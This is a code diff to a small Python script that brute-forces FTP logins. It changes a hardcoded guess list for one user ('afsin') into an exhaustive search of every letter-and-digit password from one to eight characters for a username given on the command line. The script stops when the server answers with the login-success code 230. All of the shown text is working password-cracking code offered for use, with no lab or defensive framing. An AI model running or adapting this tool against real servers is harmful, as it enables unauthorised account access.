@@ -22,16 +22,21 @@ def connect(username, password):
 
     return data
 
-username = 'afsin'
-comb = itertools.product('abcdefghiklmnopqrstuwyz', repeat=2)
+username = sys.argv[3]
 
-for x in comb:
-    suffix=''.join(x)
-    attempt = connect(username, 'iat111' + suffix)
+for r in [1,2,3,4,5,6,7,8]:
+    comb = itertools.product('abcdefghiklmnopqrstuwyz0123456789', repeat=r)
 
-    if attempt == '230':
-        print('password found: ' + 'iat111' + suffix)
-        sys.exit(0)
-    else:
-        sys.stdout.write(suffix+'\r')
-        sys.stdout.flush()
+    for x in comb:
+        password=''.join(x)
+        attempt = connect(username, password)
+        
+        if attempt == '230':
+            print('password found: ' + password)
+            sys.exit(0)
+        else:
+            sys.stdout.write(password+'\r')
+            sys.stdout.flush()
+
+print('password not found')
+sys.exit(1)
